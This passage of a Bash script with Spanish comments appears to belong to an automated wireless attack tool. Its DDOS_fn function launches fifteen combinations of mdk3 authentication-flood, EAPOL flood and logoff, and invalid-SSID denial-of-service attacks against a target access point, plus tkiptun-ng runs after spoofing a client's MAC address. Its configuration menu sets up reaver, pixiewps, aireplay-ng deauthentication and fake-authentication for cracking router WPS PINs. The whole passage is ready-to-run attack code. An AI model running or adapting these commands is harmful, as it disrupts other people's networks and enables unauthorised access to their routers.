\033[1;37m2.  EAPOL PF1 - EAPOL PF2 - EAPOL PF3\033[1;0m
\033[1;36m3.  DOS1 - DOS2 - EAPOL PF3\033[1;0m
\033[1;37m4.  DOS1 - EAPOL PF2 - EAPOL PF3\033[1;0m
\033[1;36m5.  EAPOL LO1 - EAPOL LO2 - EAPOL LO3\033[1;0m
\033[1;37m6.  DOS1 - DOS2 - EAPOL LO3\033[1;0m
\033[1;36m7.  EAPOL LO1 - EAPOL LO2 - DOS3\033[1;0m
\033[1;37m8.  EAPOL LO1 - EAPOL LO2 - EAPOL PF3\033[1;0m
\033[1;36m9.  EAPOL LO1 - EAPOL PF2 - EAPOL PF3\033[1;0m
\033[1;37m10. EAPOL LO1 - EAPOL PF2 - DOS3\033[1;0m
\033[1;36m11. Tkiptun-ng1 - Tkiptun-ng2 - Tkiptun-ng3\033[1;0m
\033[1;37m12. Invalid SSID1 -Invalid SSID2 - Invalid SSID3\033[1;0m
\033[1;36m13. DOS1 - Invalid SSID2 - Invalid SSID3\033[1;0m
\033[1;37m14. DOS1 - DOS2 - Invalid SSID3\033[1;0m
\033[1;36m15. DOS1 - EAPOL PF2 - Invalid SSID3\033[1;0m
   note: PF=Packet Flooding
         LO=Log Off")

echo "$MDKMENU" > /tmp/"MDKMENU"

Eterm -g 48x21-1+1 --cmod "red" -T "DDOS Menu" -e sh -c "cat < /tmp/MDKMENU; sleep 360" &

}

#~~~~~~~~~~~Fin DDOS Menú desplegable Fin~~~~~~~~~#

#~~~~~~~~~~~~~~Empezar MDK DDOS Empezar~~~~~~~~~~~~~~~#

DDOS_fn()

{

	if [ $MDKTYPE1 == 0 ]; then

		ASSOC_CLIENT_fn

		fi


	if [ $MDKTYPE1 == 1 ]; then

ASSOC_CLIENT_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "mdk3 DOS 1" -e sh -c "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "mdk3 DOS 2" -e sh -c "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "mdk3 DOS 3" -e sh -c "mdk3 $MON2 a -a  $TARGETAP1 -s 200 -m" & 

       fi

#####start mdk3 EAPOL #######

	if [ $MDKTYPE1 == 2 ]; then

ASSOC_CLIENT_fn

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "EAPOL Packet Flooding 1" -e sh  -c "mdk3 $MON x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

sleep 1

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "EAPOL Packet Flooding 2" -e sh  -c "mdk3 $MON1 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

sleep 1

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "EAPOL Packet Flooding 3" -e sh  -c "mdk3 $MON2 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

	fi

#####Start mdk3 combined DOS Heavy ###### 

	if [ $MDKTYPE1 == 3 ]; then

ASSOC_CLIENT_fn
sleep 1

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "mdk3 DOS 1" -e sh -c "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "mdk3 DOS 2" -e sh -c "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "EAPOL Packet Flooding 3" -e sh  -c "mdk3 $MON2 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

	fi      

#####Start mdk3 combined heavy on EAPOL ###### 

	if [ $MDKTYPE1 == 4 ]; then

ASSOC_CLIENT_fn
sleep 1


	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "mdk3 DOS 1" -e sh -c "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "EAPOL Packet Flooding 2" -e sh  -c "mdk3 $MON1 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

sleep 1

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "EAPOL Packet Flooding 3" -e sh  -c "mdk3 $MON2 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

	fi      

# Pure log off

	if [ $MDKTYPE1 == 5 ]; then

ASSOC_CLIENT_fn
sleep 1

	if [ ! -z  $CLIASO_MAX ]; then

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "EAPOL Logoff 1" -e sh  -c "mdk3 $MON x 1 -t $TARGETAP1 -c $CLIASO_MAX -s 100" &

	else

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "mdk3 DOS 1" -e sh -c "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" & 

		fi

sleep 1

	if [ ! -z  $CLIASO_MID ]; then

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "EAPOL Logoff 2" -e sh  -c "mdk3 $MON1 x 1 -t $TARGETAP1 -c $CLIASO_MID -s 100" &

	else

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "mdk3 DOS 2" -e sh -c "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" & 

		fi

sleep 1

	if [ ! -z  $CLIASO_LOW ]; then

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "EAPOL Logoff 3" -e sh  -c "mdk3 $MON2 x 1 -t $TARGETAP1 -c $$CLIASO_LOW -s 100" &

	else

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "mdk3 DOS 3" -e sh -c "mdk3 $MON2 a -a  $TARGETAP1 -s 200 -m" & 

		fi

			fi

# DOS pesado EAPOL log off lite


	if [ $MDKTYPE1 == 6 ]; then

ASSOC_CLIENT_fn
sleep 1

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "mdk3 DOS 1" -e sh -c "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "mdk3 DOS 2" -e sh -c "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

	if [ ! -z  $CLIASO_MAX ]; then

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "EAPOL Logoff 3" -e sh  -c "mdk3 $MON2 x 1 -t $TARGETAP1 -c $CLIASO_MAX -s 100" &

	else

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "mdk3 DOS 3" -e sh -c "mdk3 $MON2 a -a  $TARGETAP1 -s 200 -m" & 

		fi

	fi

# DOS pesado EAPOL log off lite

	if [ $MDKTYPE1 == 7 ]; then

ASSOC_CLIENT_fn
sleep 1

		if [ ! -z  $CLIASO_MAX ]; then

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "EAPOL Logoff 1" -e sh  -c "mdk3 $MON x 1 -t $TARGETAP1 -c $CLIASO_MAX -s 100" &

		else

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "mdk3 DOS 1" -e sh -c "mdk3 $MON a -a $TARGETAP1 -s 200 -m" &

			fi

sleep 1

		if [ ! -z  $CLIASO_MID ]; then

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "EAPOL Logoff 2" -e sh  -c "mdk3 $MON1 x 1 -t $TARGETAP1 -c $CLIASO_MID -s 100" &

		else

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "mdk3 DOS 2" -e sh -c "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" &


		fi

sleep 1

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "mdk3 DOS 3" -e sh -c "mdk3 $MON2 a -a  $TARGETAP1 -s 200 -m" & 

       fi

# EAPOL log off fuerte EAPOL La inundación de paquetes Lite

	if [ $MDKTYPE1 == 8 ]; then

ASSOC_CLIENT_fn
sleep 1

		if [ ! -z  $CLIASO_MAX ]; then

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "EAPOL Logoff 1" -e sh  -c "mdk3 $MON x 1 -t $TARGETAP1 -c CLIASO_MAX -s 100" &

		else

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "mdk3 DOS 1" -e sh -c "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" &

		fi

sleep 1

		if [ ! -z  $CLIASO_MID ]; then

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "EAPOL Logoff 2" -e sh  -c "mdk3 $MON1 x 1 -t $TARGETAP1 -c $CLIASO_MID -s 100" &

		else

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "mdk3 DOS 2" -e sh -c "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" &

			fi
sleep 1

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "EAPOL Packet Flooding 3" -e sh  -c "mdk3 $MON2 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

	fi

# EAPOL log off Lite EAPOL Paquete Las fuertes inundaciones


	if [ $MDKTYPE1 == 9 ]; then

ASSOC_CLIENT_fn
sleep 1

		if [ ! -z  $CLIASO_MAX ]; then

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "EAPOL Logoff 1" -e sh  -c "mdk3 $MON x 1 -t $TARGETAP1 -c CLIASO_MAX -s 100" &

			else

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "mdk3 DOS 1" -e sh -c "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" &

				fi

sleep 1

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "EAPOL Packet Flooding 2" -e sh  -c "mdk3 $MON1 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

sleep 1

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "EAPOL Packet Flooding 3" -e sh  -c "mdk3 $MON2 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

	fi

# EAPOL log off Lite EAPOL La inundación de paquetes Lite DOS Lite

	if [ $MDKTYPE1 == 10 ]; then

ASSOC_CLIENT_fn
sleep 1

		if [ ! -z  $CLIASO_MAX ]; then

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "EAPOL Logoff 1" -e sh  -c "mdk3 $MON x 1 -t $TARGETAP1 -c CLIASO_MAX -s 100" &

			else

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "mdk3 DOS 1" -e sh -c "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" &

				fi

sleep 1

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "EAPOL Packet Flooding 2" -e sh  -c "mdk3 $MON1 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

sleep 1

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "mdk3 DOS 3" -e sh -c "mdk3 $MON2 a -a  $TARGETAP1 -s 200 -m" & 

	fi

# tkiptun-ng

	if [ $MDKTYPE1 == 11 ]; then

ASSOC_CLIENT_fn
sleep 1

	# Cambie mac al cliente asociado si existe

	if [ ! -z  $CLIASO_MAX ]; then

			ifconfig $MON down
			sleep .1
			macchanger -m $CLIASO_MAX $MON
			sleep 2
			ifconfig $MON up

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "tkiptun-ng 1" -e sh -c "tkiptun-ng -a $TARGETAP1 -h $CLIASO_MAX $MON" & 

			else

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "tkiptun-ng 1" -e sh -c "tkiptun-ng -a $TARGETAP1 -h $MONMAC0 $MON" &

			fi

	# Cambie mac al cliente asociado si existe

	if [ ! -z  $CLIASO_MID ]; then

			ifconfig $MON1 down
			sleep .1
			macchanger -m $CLIASO_MID $MON1
			sleep 2
			ifconfig $MON1 up

sleep 1

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "tkiptun-ng 2" -e sh -c "tkiptun-ng -a $TARGETAP1 -h $CLIASO_MID  $MON1" &
	
			else

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "tkiptun-ng 2" -e sh -c "tkiptun-ng -a $TARGETAP1 -h $MONMAC1  $MON1" &

			fi
sleep 1

	# Cambie mac al cliente asociado si existe

	if [ ! -z  $CLIASO_LOW ]; then

			ifconfig $MON2 down
			sleep .1
			macchanger -m $CLIASO_LOW $MON2
			sleep 2
			ifconfig $MON2 up

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "tkiptun-ng 3" -e sh -c "tkiptun-ng -a $TARGETAP1 -h $CLIASO_LOW $MON2" &

			else

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "tkiptun-ng 3" -e sh -c "tkiptun-ng -a $TARGETAP1 -h $MONMAC2 $MON2" &

		fi

	fi

	if [ $MDKTYPE1 == 12 ]; then

ASSOC_CLIENT_fn
sleep 1

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "mdk-Invalid SSID1" -e sh -c "/root/mdk3-v6/mdk3 $MON t $CHANNEL_MDK $TARGETAP1 10" & 

sleep 2

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "mdk-Invalid SSID2" -e sh -c "/root/mdk3-v6/mdk3 $MON1 t $CHANNEL_MDK $TARGETAP1 10" & 

sleep 1

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "mdk-Invalid SSID3" -e sh -c "/root/mdk3-v6/mdk3 $MON2 t $CHANNEL_MDK $TARGETAP1 10" &

	fi      

	if [ $MDKTYPE1 == 13 ]; then

ASSOC_CLIENT_fn
sleep 1

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "mdk3 DOS 1" -e sh -c "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" &

sleep 2

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "mdk-Invalid SSID2" -e sh -c "/root/mdk3-v6/mdk3 $MON1 t $CHANNEL_MDK $TARGETAP1 10" & 

sleep 1

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "mdk-Invalid SSID3" -e sh -c "/root/mdk3-v6/mdk3 $MON2 t $CHANNEL_MDK $TARGETAP1 10" &

	fi

	if [ $MDKTYPE1 == 14 ]; then

ASSOC_CLIENT_fn
sleep 1

	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "mdk3 DOS 1" -e sh -c "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" &

sleep 2

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "mdk3 DOS 2" -e sh -c "mdk3 $MON1 a -a  $TARGETAP1 -s 200 -m" &

sleep 1

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "mdk-Invalid SSID3" -e sh -c "/root/mdk3-v6/mdk3 $MON2 t $CHANNEL_MDK $TARGETAP1 10" &

	fi

	if [ $MDKTYPE1 == 15 ]; then

ASSOC_CLIENT_fn
sleep 1
#mdk3 DOS 1/EAPOL Packet Flooding 2/mdk-no válido SSID3
	Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "mdk3 DOS 1" -e sh -c "mdk3 $MON a -a  $TARGETAP1 -s 200 -m" & 

sleep 1

	Eterm -g 80x10-1+200 --cmod "red" --no-cursor  -T "EAPOL Packet Flooding 2" -e sh  -c "mdk3 $MON1 x 0 -t $TARGETAP1 -n $NMEWARN1 -s 100" &

sleep 1

	Eterm -g 80x10-1+400 --cmod "red" --no-cursor  -T "mdk-Invalid SSID3" -e sh -c "/root/mdk3-v6/mdk3 $MON2 t $CHANNEL_MDK $TARGETAP1 10" &

	fi

######   DAMP MDK=y

}

#~~~~~~~~~~~~~~~~fin DDOS_fn~~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Empezar Manual de Manejo Config Empezar~~~~~~~~~~~~~~~#

CONFIG_ADJUST_fn()
{

source /root/VARMAC_CONFIG/$SOURCENAME

# Guarde las 22 variables de origen antes de cambiar w / menú

CHANNELOLD=$CHANNEL1
USE_R1OLD=$USE_R1
RX1OLD=$RX1
RY1OLD=$RY1
LIVE1OLD=$LIVE1
USE_LONG1OLD=$USE_LONG1
MDKTYPE1OLD=$MDKTYPE1
MDKLIVEOLD=$MDKLIVE
PAUSEOLD=$PAUSE
REAVER_COUNTOLD=$REAVER_COUNT
MDK3_COUNTOLD=$MDK3_COUNT
WASH_COUNTOLD=$WASH_COUNT
DAMP_MDKOLD=$DAMP_MDK
ADVAN_TIMEOLD=$ADVAN_TIME
USE_AIRE1OLD=$USE_AIRE1
USE_AIRE0OLD=$USE_AIRE0
USE_DHSMALLOLD=$USE_DHSMALL
MACSELOLD=$MACSEL
ASSIGN_MACOLD=$ASSIGN_MAC
USE_PIXIEOLD=$USE_PIXIE
USE_FIRSTPINOLD=$USE_FIRSTPIN
RETESTPINOLD=$RETESTPIN

clear
echo -e "$info"
echo -e  "    Revise los comentarios - Para cambiar,$inp entrar$info el$yel número de línea$info del parámetro a alterar y"
echo -e  "  siga las indicaciones del programa. Los cambios de entrada serán$yel escrito$info a$yel $CON_FILENAME1-$MACALNUM$info."
echo ""
echo -e "$inp  1)$info Canal 0 (Cero en casi todos los casos)         $txtrst default= 0  $inp [$yel $CHANNEL1 $inp]"
echo -e "$inp  2)$info Utilice -r x: y con reaver (y/n)               $txtrst default= y  $inp [$yel $USE_R1 $inp]"
echo -e "$inp  3)$info x en -r x:y (numero de veces)                  $txtrst default= 2  $inp [$yel $RX1 $inp]"
echo -e "$inp  4)$info y en -r x:y en segundo                         $txtrst default= 15 $inp [$yel $RY1 $inp]"
echo -e "$inp  5)$info Reaver Vive Tiempo en segundos(Stage II)       $txtrst default= 120$inp [$yel $LIVE1 $inp]"
echo -e "$inp  6)$info El uso a largo Reaver Command y/n              $txtrst default= y  $inp [$yel $USE_LONG1 $inp]"
echo -e "$inp  7)$info MDK Tipo de Ataque 0-15(Stage III)             $txtrst default= 4  $inp [$yel $MDKTYPE1 $inp]"
echo -e "$inp  8)$info Tiempo en segundos MDK3 está activo(Stage III) $txtrst default= 15 $inp [$yel $MDKLIVE $inp]"
echo -e "$inp  9)$info Router Restablecer w / Lavado en seg(Stage IV) $txtrst default= 120$inp [$yel $PAUSE $inp]"
echo -e "$inp  10)$info Reaver contador regresivo(Stage II) y/n       $txtrst default= y  $inp [$yel $REAVER_COUNT $inp]"
echo -e "$inp  11)$info MDK3 contador regresivo(Stage III) y/n        $txtrst default= n  $inp [$yel $MDK3_COUNT $inp]"
echo -e "$inp  12)$info WASH contador regresivo(Stage IV) y/n         $txtrst default= y  $inp [$yel $WASH_COUNT $inp]"
echo -e "$inp  13)$info Humedezca MDK3(Stage III) y/n                 $txtrst default= y  $inp [$yel $DAMP_MDK $inp]"
echo -e "$inp  14)$info Escaneo Avanzado en seg y/n                   $txtrst default= 120$inp [$yel $ADVAN_TIME $inp]"
echo -e "$inp  15)$info Aireplay --fakeauth(Stage I/II) y/n           $txtrst default= y  $inp [$yel $USE_AIRE1 $inp]"
echo -e "$inp  16)$info Aireplay --Deauth(Stage I/II) y/n             $txtrst default= n  $inp [$yel $USE_AIRE0 $inp]"
echo -e "$inp  17)$info Usar --dhsmall Reaver(Stage I/II) y/n         $txtrst default= y  $inp [$yel $USE_DHSMALL $inp]"
echo -e "$inp  18)$info Introduzca la dirección MAC de la parodia y/n $txtrst default= n  $inp [$yel $MACSEL $inp]"
echo -e "$inp  19)$info Mac tratar de suplantar en hexadecimal$txtrst AA:BC:DD:33:22:11$inp [$yel $ASSIGN_MAC $inp]"
echo -e "$inp  20)$info Usar Pixiewps(Stage IV) y/n                   $txtrst default= y  $inp [$yel $USE_PIXIE $inp]"
echo -e "$inp  21)$info Vuelva a probar WPS pin 12345670 y/n          $txtrst default= y  $inp [$yel $USE_FIRSTPIN $inp]"
echo -e "$inp  22)$info Vuelva a probar pin 12345670 every x ciclos   $txtrst default= 10 $inp [$yel $RETESTPIN $inp]"
echo -e "$inp      c/C)continuar$txtrst"

read var
case $var in

	1) echo -e "\033[36m\n$info Introduzca CANAL - Zero(0) se debe utilizar en casi todos los casos? Canal Ajuste sólo si mdk3 no utilizados y el router no cambia canales.  $txtrst"
	read CHANNEL1
	tput sc
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/CHANNEL1=$CHANNELOLD/CHANNEL1=$CHANNEL1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	2) echo -e "\033[36m\n$info Usar -r x:y en el reaver command Línea Ingrese y/n?$txtrst"
	read USE_R1
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/USE_R1=$USE_R1OLD/USE_R1=$USE_R1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	3) echo -e "\033[36m\n$info x (veces) en -r x:y?$txtrst"
	read RX1
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/RX1=$RX1OLD/RX1=$RX1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	4) echo -e "\033[36m\n$info y (reposo en seg) en -r x:y Introduzca segundos?$txtrst"
	read RY1
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/RY1=$RY1OLD/RY1=$RY1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	5) echo -e "\033[36m\n$info Reaver Tiempo en Vivo(Ataque Stage II) Introduzca segundos?$txtrst"
	read LIVE1
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/LIVE1=$LIVE1OLD/LIVE1=$LIVE1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	6) echo -e "\033[36m\n$info El uso a largo Reaver Command Línea(Selección de los mejores para WPS bloqueado routers) Ingrese y/n$txtrst"
	read USE_LONG1
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/USE_LONG1=$USE_LONG1OLD/USE_LONG1=$USE_LONG1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	7) echo -e "\033[36m\n$info MDK3 Tipo de Ataque - Introduzca un número de 0 a 15.$txtrst"
	MDKMENU_fn
	read MDKTYPE1
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/MDKTYPE1=$MDKTYPE1OLD/MDKTYPE1=$MDKTYPE1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	killall -q Eterm
	CONFIG_ADJUST_fn;;

	8) echo -e "\033[36m\n$info MDK3 Tiempo en Vivo(Stage III) - Introduzca segundos para atacar enrutador$txtrst"
	read MDKLIVE
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/MDKLIVE=$MDKLIVEOLD/MDKLIVE=$MDKLIVE/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	9) echo -e "\033[36m\n$info Router periodo Restablecer(Stage IV) Introduzca segundos$txtrst"
	read PAUSE
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/PAUSE=$PAUSEOLD/PAUSE=$PAUSE/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	10) echo -e "\033[36m\n$info Use Reaver Countdown Timer - Enter y/n  $txtrst"
	read REAVER_COUNT
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/REAVER_COUNT=$REAVER_COUNTOLD/REAVER_COUNT=$REAVER_COUNT/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	11) echo -e "\033[36m\n$info Use MDK3 Countdown Timer Enter y/n  $txtrst"
	read MDK3_COUNT
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/MDK3_COUNT=$MDK3_COUNTOLD/MDK3_COUNT=$MDK3_COUNT/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	12) echo -e "\033[36m\n$info Use Wash Countdown Timer Enter y/n  $txtrst"
	read WASH_COUNT
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/WASH_COUNT=$WASH_COUNTOLD/WASH_COUNT=$WASH_COUNT/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	13) echo -e "\033[36m\n$info Humedezca MDK3 cuando está inactivo objetivo Ingrese y/n  $txtrst"
	read DAMP_MDK
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/DAMP_MDK=$DAMP_MDKOLD/DAMP_MDK=$DAMP_MDK/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	14) echo -e "\033[36m\n$info Advanced Hora Escaneo  Ingrese en seg  $txtrst"
	read ADVAN_TIME
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/ADVAN_TIME=$ADVAN_TIMEOLD/ADVAN_TIME=$ADVAN_TIME/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	15) echo -e "\033[36m\n$info Usar Aireplay-ng --fakeauth Ingrese y/n  $txtrst"
	read USE_AIRE1
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/USE_AIRE1=$USE_AIRE1OLD/USE_AIRE1=$USE_AIRE1/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	16) echo -e "\033[36m\n$info Usar Aireplay-ng --deauth Ingrese y/n   $txtrst"
	read USE_AIRE0
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/USE_AIRE0=$USE_AIRE0OLD/USE_AIRE0=$USE_AIRE0/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	17) echo -e "\033[36m\n$info Usar --dhsmall w/Reaver Ingrese y/n  $txtrst"
	read USE_DHSMALL
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/USE_DHSMALL=$USE_DHSMALLOLD/USE_DHSMALL=$USE_DHSMALL/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	18) echo -e "\033[36m\n$info Usar unas específicas direcciones de Mac y/n  $txtrst"
	read MACSEL
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/MACSEL=$MACSELOLD/MACSEL=$MACSEL/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	19) echo -e "\033[36m\n$info Introduzca las direcciones mac en este formato SÓLO AA:BC:DD:55:44:22  $txtrst"
	read ASSIGN_MAC
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/ASSIGN_MAC=$ASSIGN_MACOLD/ASSIGN_MAC=$ASSIGN_MAC/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	20) echo -e "\033[36m\n$info Usar Pixiewps (StageIV) Ingrese y/n  $txtrst"
	read USE_PIXIE
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/USE_PIXIE=$USE_PIXIEOLD/USE_PIXIE=$USE_PIXIE/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

	21) echo -e "\033[36m\n$info Vuelva a probar WPS Pin 12345670 Ingrese y/n  $txtrst"
	read USE_FIRSTPIN
	tput rc
	tput ed
	cp /root/VARMAC_CONFIG/$SOURCENAME /tmp/CONFIGHOLD.txt
	cat /tmp/CONFIGHOLD.txt | sed  -e "s/USE_FIRSTPIN=$USE_FIRSTPINOLD/USE_FIRSTPIN=$USE_FIRSTPIN/g" > /root/VARMAC_CONFIG/$SOURCENAME
	CONFIG_ADJUST_fn;;

